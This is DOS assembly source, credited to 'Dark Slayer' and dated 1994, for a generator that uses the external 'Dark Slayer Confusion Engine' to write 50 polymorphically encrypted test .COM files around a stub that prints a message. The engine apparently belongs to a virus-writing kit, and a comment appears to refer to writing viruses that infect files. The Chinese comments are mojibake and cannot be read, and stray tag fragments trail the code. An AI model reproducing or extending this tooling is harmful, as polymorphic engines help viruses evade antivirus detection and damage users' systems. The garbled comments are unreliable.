


; Dark Slayer Confusion Engine v1.0 <04-19-94>
;     Written by Dark Slayer in Keelung, Taiwan <r.o.c>

DSCE_GEN SEGMENT
         ASSUME  CS:DSCE_GEN,DS:DSCE_GEN
         ORG     0100h

MSG_ADDR EQU     OFFSET MSG-OFFSET PROC_START-0007h

         EXTRN   DSCE:NEAR,DSCE_END:NEAR
         EXTRN   RND:NEAR

                      ; ¥H¤Uµ{¦¡¡A°£¤F­nª`·Nªº¦a¤è¦³ª`¸Ñ¡A¨ä¥¦³¡¥÷¦Û¤v¬ã¨s

START:
         MOV     AH,09h
         MOV     DX,OFFSET DG_MSG
         INT     21h

         MOV     AX,OFFSET DSCE_END+000Fh ; ¥»µ{¦¡ + DSCE+000Fh ¤§«áªº¦ì§}
                                   ; ­Y´î 0100h «h¦¨¬°¥»µ{¦¡ + DSCE ªºªø«×

         MOV     CL,04h
         SHR     AX,CL
         MOV     BX,CS
         ADD     BX,AX

         MOV     ES,BX                   ; ³] ES ¥Î¨Ó©ñ¸Ñ½Xµ{¦¡©M³Q½s½X¸ê®Æ
                                                ; ¸Ñ½Xµ{¦¡³Ì¤j¬° 1024 Bytes
                                ; ­Y¥Î¦b±`¾nµ{¦¡®É¡A«h¶·ª`·N¤À°tªº°O¾ÐÅé¤j¤p

         MOV     CX,50
DG_L0:
         PUSH    CX
         MOV     AH,3Ch
         XOR     CX,CX
         MOV     DX,OFFSET FILE_NAME
         INT     21h
         XCHG    BX,AX

         MOV     BP,0100h                                ; ¸Ñ½Xµ{¦¡°¾²¾¦ì§}
                                       ; ¥Î¨Ó¼g¬r®É«h¨Ì±ý·P¬VÀÉ®×¤§¤j¤p¦Ó³]

         MOV     CX,OFFSET PROC_END-OFFSET PROC_START    ; ³Q½s½Xµ{¦¡ªºªø«×

         MOV     DX,OFFSET PROC_START         ; DS:DX -> ­n³Q½s½Xªºµ{¦¡¦ì§}

         PUSH    BX                                      ; «O¦s File handle

         CALL    RND
         XCHG    BX,AX
         CALL    DSCE

         POP     BX

         MOV     AH,40h        ; ªð¦^®É DS:DX = ¸Ñ½Xµ{¦¡ + ³Q½s½Xµ{¦¡ªº¦ì§}
         INT     21h     ; CX = ¸Ñ½Xµ{¦¡ + ³Q½s½Xµ{¦¡ªºªø«×¡A¨ä¥¦¼È¦s¾¹¤£ÅÜ

         MOV     AH,3Eh
         INT     21h

         PUSH    CS
         POP     DS                                          ; ±N DS ³]¦^¨Ó

         MOV     BX,OFFSET FILE_NUM
         INC     BYTE PTR DS:[BX+0001h]
         CMP     BYTE PTR DS:[BX+0001h],'9'
         JBE     DG_L1
         INC     BYTE PTR DS:[BX]
         MOV     BYTE PTR DS:[BX+0001h],'0'
DG_L1:
         POP     CX
         LOOP    DG_L0
         MOV     AH,4Ch
         INT     21h

FILE_NAME DB     '000000'
FILE_NUM DB      '00.COM',00h

DG_MSG   DB      'Generates 50 DSCE encrypted test files.',0Dh,0Ah,'$'

PROC_START:
         PUSH    CS
         POP     DS
         MOV     AH,09h
         CALL    $+0003h
         POP     DX
         ADD     DX,MSG_ADDR
         INT     21h
         INT     20h
MSG      DB      'Dark Slayer !!$'
PROC_END:

DSCE_GEN ENDS
         END     START

</r.o.c></04-19-94>